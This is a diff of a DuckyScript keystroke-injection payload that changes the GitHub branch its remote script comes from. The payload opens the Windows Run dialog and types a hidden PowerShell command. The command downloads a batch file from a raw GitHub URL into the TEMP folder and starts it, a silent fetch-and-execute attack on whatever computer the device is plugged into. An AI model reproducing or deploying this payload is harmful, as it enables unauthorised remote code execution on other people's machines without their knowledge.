@@ -1,7 +1,7 @@
 DELAY 2500
 GUI r
 DELAY 200
-STRING powershell /NoProfile /NoLogo /Windowstyle hidden /Command "iwr https://raw.githubusercontent.com/pytNick/autoDuckV3/main/autoDuckV3.bat -OutFile $env:TEMP\autoDuckV3.bat; start $env:TEMP\autoDuckV3.bat"
+STRING powershell /NoProfile /NoLogo /Windowstyle hidden /Command "iwr https://raw.githubusercontent.com/pytNick/autoDuckV3/FunkyMonkey/autoDuckV3.bat -OutFile $env:TEMP\autoDuckV3.bat; start $env:TEMP\autoDuckV3.bat"
 DELAY 200
 ENTER
 DELAY 2000
